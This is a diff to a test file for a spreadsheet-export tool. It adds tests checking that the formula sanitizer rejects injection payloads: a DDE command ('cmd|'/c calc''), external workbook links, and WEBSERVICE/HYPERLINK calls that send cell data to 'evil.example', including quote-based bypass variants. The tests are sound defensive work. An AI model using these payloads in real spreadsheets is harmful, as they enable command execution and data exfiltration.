@@ -159,7 +159,7 @@ describe('make_file', () => {
     expect(text).toContain('=XLOOKUP(')
 
     for (const [bad, why] of [
-      ["=cmd|'/c calc'!A1", 'DDE'], ['=[1]Sheet1!A1', 'other files'], ["='C:\\x\\[b.xlsx]S'!A1", 'other files'],
+      ["=cmd|'/c calc'!A1", 'DDE'], ['=SUM([1]Sheet1!A1)', 'other files'], ['=[1]Sheet1!A1+1', 'other files'], ["='C:\\x\\[b.xlsx]S'!A1", 'other files'],
       ['=HYPERLINK("https://example.com","x")', 'HYPERLINK'], ['=WEBSERVICE("https://example.com")', 'WEBSERVICE'], ['=SUM(INDIRECT("A1"))', 'INDIRECT'],
     ]) {
       const e = await call('alice', null, 'make_file', { content: `a,b\n1,"${bad!.replace(/"/g, '""')}"\n`, format: 'xlsx', output: 'users/alice/out/bad.xlsx' })
@@ -175,6 +175,54 @@ describe('make_file', () => {
     expect(formulaOf('== note ==')).toHaveProperty('error')
     expect(formulaOf("'S (1)'!A1+SUM(A1:A2)")).toEqual({ formula: "'S (1)'!A1+SUM(A1:A2)" })
     expect([cellValue('=SUM(A1:A2)'), cellValue("'=x"), cellValue('='), cellValue("'quoted'")]).toEqual([{ formula: 'SUM(A1:A2)' }, '=x', '=', "'quoted'"])
+  })
+  test('xlsx formulas: quotes in quoted sheet names do not hide blocked parts (review bypass)', async () => {
+    // a '"' inside a 'quoted sheet name' must not open a string literal that hides the code after it
+    const bypass = [
+      `N("")&'x"'!A1&WEBSERVICE("http://evil.example/?"&A1)&'y"'!A1`,
+      `N("")&'x"'!A1&HYPERLINK("http://evil.example/","x")&'y"'!A1`,
+      `N("")&'x"'!A1&cmd|'/c calc'!A1&'y"'!A1`,
+      `N("")&'x"'!A1&[1]S!A1&'y"'!A1`,
+      `N("")&'x"'!A1&'C:\\x\\b'!A1&'y"'!A1`,
+      `_xlws.WEBSERVICE("http://evil.example/")`,
+      `_xludf.HYPERLINK("http://evil.example/")`,
+      `'a|b'!A1`,
+      `'[1]S'!A1`,
+      `'x"'!A1`,
+    ]
+    for (const f of bypass) expect(formulaOf(f), f).toHaveProperty('error')
+    for (const f of bypass.slice(0, 5)) {
+      const e = await call('alice', null, 'make_file', { content: `a,b\n1,"=${f.replace(/"/g, '""')}"\n`, format: 'xlsx', output: 'users/alice/out/bypass.xlsx' })
+      expect(e.isError, f).toBe(true)
+      expect(fs.existsSync(path.join(A.team, 'users/alice/out/bypass.xlsx'))).toBe(false)
+    }
+    // generated sheet names have no quote characters, and a formula that names a quoted sheet with '"' is refused
+    const md = '## x"\n\n| a |\n|---|\n| 1 |\n\n## y\'\n\n| a |\n|---|\n| 2 |\n'
+    const ok = await call('alice', null, 'make_file', { content: md, format: 'xlsx', output: 'users/alice/out/names.xlsx' })
+    expect(ok.isError, ok.text).toBe(false)
+    const names = XLSX.read(fs.readFileSync(path.join(A.team, 'users/alice/out/names.xlsx'))).SheetNames
+    expect(names.some((n) => /["']/.test(n)), names.join(',')).toBe(false)
+    const bad = md + `\n## z\n\n| a |\n|---|\n| =N("")&'x"'!A1&WEBSERVICE("http://evil.example/")&'y"'!A1 |\n`
+    const e = await call('alice', null, 'make_file', { content: bad, format: 'xlsx', output: 'users/alice/out/names2.xlsx' })
+    expect(e.isError, e.text).toBe(true)
+    expect(fs.existsSync(path.join(A.team, 'users/alice/out/names2.xlsx'))).toBe(false)
+  })
+  test('xlsx: a cell is a formula only when an operand follows "="; other "=" text stays text', async () => {
+    for (const t of ['=> done', '= see note', '=-', '== note ==', "='hello'", '=see (note)', '=Total', '=?']) expect(cellValue(t), t).toBe(t)
+    expect(cellValue('=-A1')).toEqual({ formula: '-A1' })
+    expect(cellValue('=+SUM(A1:A2)')).toEqual({ formula: '+SUM(A1:A2)' })
+    expect(cellValue('=(A1+1)*2')).toEqual({ formula: '(A1+1)*2' })
+    expect(cellValue('="a"&B2')).toEqual({ formula: '"a"&B2' })
+    expect(cellValue('=12.5*2')).toEqual({ formula: '12.5*2' })
+    expect(cellValue('=$B$2+B:B')).toEqual({ formula: '$B$2+B:B' })
+    expect(cellValue('=지역별!F2')).toEqual({ formula: '지역별!F2' })
+    expect(cellValue("='S 1'!A1")).toEqual({ formula: "'S 1'!A1" })
+    expect(cellValue('=TRUE')).toEqual({ formula: 'TRUE' })
+    expect(cellValue('=A1+')).toHaveProperty('error')
+    const r = await call('alice', null, 'make_file', { content: 'a,b\n1,=> done\n2,= see note\n', format: 'xlsx', output: 'users/alice/out/text.xlsx' })
+    expect(r.isError, r.text).toBe(false)
+    const ws = XLSX.read(fs.readFileSync(path.join(A.team, 'users/alice/out/text.xlsx'))).Sheets.Sheet1!
+    expect([ws.B2.v, ws.B2.f, ws.B3.v, ws.B3.f]).toEqual(['=> done', undefined, '= see note', undefined])
   })
   test('source file and team images (only readable ones) work; an existing file gets a conflict copy unless read this turn', async () => {
     const png = path.join(A.data, 'p.png')
